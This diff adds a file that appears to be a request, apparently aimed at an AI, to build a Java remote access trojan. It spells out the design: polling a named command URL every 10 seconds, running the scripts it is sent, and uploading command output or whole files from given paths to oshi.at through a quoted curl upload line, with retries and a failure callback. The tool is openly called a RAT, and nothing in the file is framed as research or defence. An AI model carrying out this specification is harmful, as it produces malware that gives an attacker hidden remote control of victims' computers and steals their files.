@@ -1,0 +1,30 @@
+Create Java RAT class. When executing, shall repeatedly call to https://kukkirimlu.pythonanywhere.com/static/1.1.1.1.txt, in order to get response of a special format, example response: 
+"{
+"type": "execute" or "sharefile" (string),
+"target": "command to execute (may be a .bat file with all thoose \n's for Windows hosts or bash file) or absolute file path" (string),
+"oshihost": "https://oshi.at/" (string),
+"exp": "129600" (integer),
+"name": uniquename (string),
+"retry": n-retries (integer)
+}"
+
+Reqeusts to https://kukkirimlu.pythonanywhere.com/static/1.1.1.1.txt shall repeat each 10 seconds. Provide me a code that carefully parses this format and uses.
+Hash of previous response is saved. If hash doesn't match with current, then config is starting to be executed. During the execution requests to a new config does stop, after the execution they resume.
+
+If command ("type") is execute, the the target is retrieved as a script and launched as for os. Whole output of command (or all commands if bat/bash passed) 
+shall be recorded and sent to oshi.at based on oshihost, exp and name.
+if oshi fails, then there n-retries, each time incrementing uniquename (like uniquename1, uniquename2, uniquename3...).
+If fails competely, then single call to https://kukkirimlu.pythonanywhere.com/static/1.1.1.1_failed.txt is made.
+
+If command is sharefile, then the file of the provided path gets uploaded to oshi like the output described above.
+Whole file at given path shall be read and sent to oshi.at based on oshihost, exp and name.
+if oshi fails, then there n-retries, each time incrementing uniquename (like uniquename1, uniquename2, uniquename3...).
+If fails competely, then single call to https://kukkirimlu.pythonanywhere.com/static/1.1.1.1_failed.txt is made.
+
+Oshi Uploading (you need to create single method):
+"curl -T /path/to/file https://oshi.at/customfilename/129600"
+/path/to/file - file path
+https://oshi.at/ - oshi host
+customfilename - uniquename
+129600 - exp (expiration time)
+Remember, that we are not using CURL is this professional cross-platform RAT, so you have to implement everything using Java Core 1.8 libraries.
